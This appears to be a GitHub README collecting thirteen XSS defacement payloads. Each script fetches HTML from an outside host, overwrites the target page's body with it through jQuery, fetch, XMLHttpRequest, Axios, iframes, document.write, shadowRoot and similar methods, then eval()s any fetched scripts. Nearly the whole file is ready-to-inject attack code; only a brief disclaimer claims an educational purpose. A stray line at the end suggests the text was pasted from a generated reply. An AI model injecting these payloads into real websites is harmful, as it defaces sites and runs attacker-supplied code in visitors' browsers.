
# XSS Deface Payloads

This repository contains various XSS (Cross-Site Scripting) deface payloads that can be used to load and execute external content. These payloads demonstrate different methods to achieve this, using various JavaScript techniques and libraries.

## Table of Contents

1. [Using jQuery to load and execute external content](#using-jquery-to-load-and-execute-external-content)
2. [Using vanilla JavaScript to load and execute external content](#using-vanilla-javascript-to-load-and-execute-external-content)
3. [Using XMLHttpRequest to load and execute external content](#using-xmlhttprequest-to-load-and-execute-external-content)
4. [Using async/await with Fetch API](#using-asyncawait-with-fetch-api)
5. [Using Axios to load and execute external content](#using-axios-to-load-and-execute-external-content)
6. [Using the `DOMParser` API to load and execute external content](#using-the-domparser-api-to-load-and-execute-external-content)
7. [Using `innerHTML` with a `div` element to load and execute external content](#using-innerhtml-with-a-div-element-to-load-and-execute-external-content)
8. [Using `insertAdjacentHTML` to load and execute external content](#using-insertadjacenthtml-to-load-and-execute-external-content)
9. [Using `document.write` to load and execute external content](#using-documentwrite-to-load-and-execute-external-content)
10. [Using `iframe` to load and execute external content](#using-iframe-to-load-and-execute-external-content)
11. [Using `innerHTML` with `template` element to load and execute external content](#using-innerhtml-with-template-element-to-load-and-execute-external-content)
12. [Using `outerHTML` to load and execute external content](#using-outerhtml-to-load-and-execute-external-content)
13. [Using `innerHTML` with `shadowRoot` to load and execute external content](#using-innerhtml-with-shadowroot-to-load-and-execute-external-content)

## Using jQuery to load and execute external content

```html
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$.get('https://karthikdude.github.io/Deface/', function(data) {
    $('body').html(data);
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
});
</script>
```

**Details:** This payload uses jQuery to perform an AJAX request to fetch the external content and then replaces the entire body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using vanilla JavaScript to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.innerHTML = html;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the Fetch API to retrieve the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using XMLHttpRequest to load and execute external content

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://karthikdude.github.io/Deface/', true);
xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
        document.body.innerHTML = xhr.responseText;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    }
};
xhr.send();
</script>
```

**Details:** This payload uses the XMLHttpRequest object to perform an AJAX request to fetch the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using async/await with Fetch API

```html
<script>
async function deface() {
    const response = await fetch('https://karthikdude.github.io/Deface/');
    const html = await response.text();
    document.body.innerHTML = html;
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
}
deface();
</script>
```

**Details:** This payload uses async/await syntax with the Fetch API to retrieve the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using Axios to load and execute external content

```html
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
axios.get('https://karthikdude.github.io/Deface/')
    .then(response => {
        document.body.innerHTML = response.data;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the Axios library to perform an AJAX request to fetch the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using the `DOMParser` API to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        document.body.innerHTML = doc.body.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the DOMParser API to parse the fetched HTML content and then replaces the body of the document with the parsed content. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with a `div` element to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const div = document.createElement('div');
        div.innerHTML = html;
        document.body.innerHTML = div.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `div` element, sets its `innerHTML` to the fetched content, and then replaces the body of the document with the `div`'s content. It also evaluates any script tags within the fetched content.

## Using `insertAdjacentHTML` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.insertAdjacentHTML('afterbegin', html);
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the `insertAdjacentHTML` method to insert the fetched content at the beginning of the body. It also evaluates any script tags within the fetched content.

## Using `document.write` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.open();
        document.write(html);
        document.close();
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses `document.write` to replace the entire document with the fetched content. It also evaluates any script tags within the fetched content.

## Using `iframe` to load and execute external content

```html
<script>
const iframe = document.createElement('iframe');
iframe.src = 'https://karthikdude.github.io/Deface/';
iframe.style.display = 'none';
document.body.appendChild(iframe);
iframe.onload = function() {
    document.body.innerHTML = iframe.contentDocument.body.innerHTML;
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
};
</script>
```

**Details:** This payload creates an `iframe` element, sets its `src` to the external content URL, and then replaces the body of the document with the content of the `iframe`. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with `template` element to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const template = document.createElement('template');
        template.innerHTML = html;
        document.body.innerHTML = template.content.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `template` element, sets its `innerHTML` to the fetched content, and then replaces the body of the document with the `template`'s content. It also evaluates any script tags within the fetched content.

## Using `outerHTML` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.outerHTML = html;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload replaces the entire `outerHTML` of the body with the fetched content. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with `shadowRoot` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const shadowHost = document.createElement('div');
        const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
        shadowRoot.innerHTML = html;
        document.body.innerHTML = shadowRoot.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `div` element with a `shadowRoot`, sets the `innerHTML` of the `shadowRoot` to the fetched content, and then replaces the body of the document with the `shadowRoot`'s content. It also evaluates any script tags within the fetched content.

## Disclaimer

These payloads are for educational purposes only. Always ensure you have proper authorization and are acting ethically when testing or using such payloads. Unauthorized use of these payloads can be illegal and unethical.
```

This `README.md` file includes all the provided payloads along with the newly generated ones, each with detailed explanations.
